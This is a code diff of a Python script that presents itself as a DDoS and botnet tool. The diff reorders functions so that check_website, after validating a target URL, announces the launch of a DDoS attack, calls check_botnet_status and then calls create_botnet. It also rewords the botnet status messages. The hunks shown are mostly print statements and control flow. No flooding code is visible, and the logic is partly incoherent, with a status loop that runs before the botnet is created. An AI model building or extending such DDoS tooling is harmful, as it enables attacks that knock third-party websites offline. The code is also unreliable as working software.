@@ -275,28 +275,6 @@ def stop_attack():
     print("Stopping the DDoS attack...")
     sys.exit()
 
-def check_website(url):
-    if not url.startswith("http://") and not url.startswith("https://"):
-        url = "http://" + url
-
-    try:
-        response = requests.get(url)
-        if response.status_code >= 200 and response.status_code < 300:
-            print("Valid URL")
-            print("Loading...")
-            time.sleep(5)
-            print("Successfully launching the DDoS attack!")
-            create_botnet()
-            print("Botnet created!")
-            print("Press CTRL+C or CTRL+Z to stop the attack.")
-            signal.signal(signal.SIGINT, stop_attack)
-            signal.signal(signal.SIGTSTP, stop_attack)
-        else:
-            print("Sorry, the website URL is not valid.")
-    except:
-        print("Sorry, the website URL is not valid.")
-
-check_website(target_url)
 
 def check_botnet_status():
     print("Checking botnet status...")
@@ -311,13 +289,38 @@ def check_botnet_status():
 
             # Check if the botnet is active or not
             if botnet_size > 0:
-                print("Botnet is active and ready to launch attacks!")
+                print("Botnet is online and ready to launch attacks!")
             else:
-                print("Botnet is offline.")
+                print("Botnet is offline. Unable to launch attacks.")
 
             time.sleep(5)  # Wait for 5 seconds before printing the status again
         except:
             pass
 
-check_botnet_status()
+def check_website(url):
+    if not url.startswith("http://") and not url.startswith("https://"):
+        url = "http://" + url
+
+    try:
+        response = requests.get(url)
+        if response.status_code >= 200 and response.status_code < 300:
+            print("Valid URL")
+            print("Loading...")
+            time.sleep(5)
+            print("Successfully launching the DDoS attack!")
+
+            check_botnet_status()
+
+            create_botnet()
+            print("Botnet created!")
+            print("Press CTRL+C or CTRL+Z to stop the attack.")
+            signal.signal(signal.SIGINT, stop_attack)
+            signal.signal(signal.SIGTSTP, stop_attack)
+        else:
+            print("Sorry, the website URL is not valid.")
+    except:
+        print("Sorry, the website URL is not valid.")
+
+check_website(target_url)
+
 
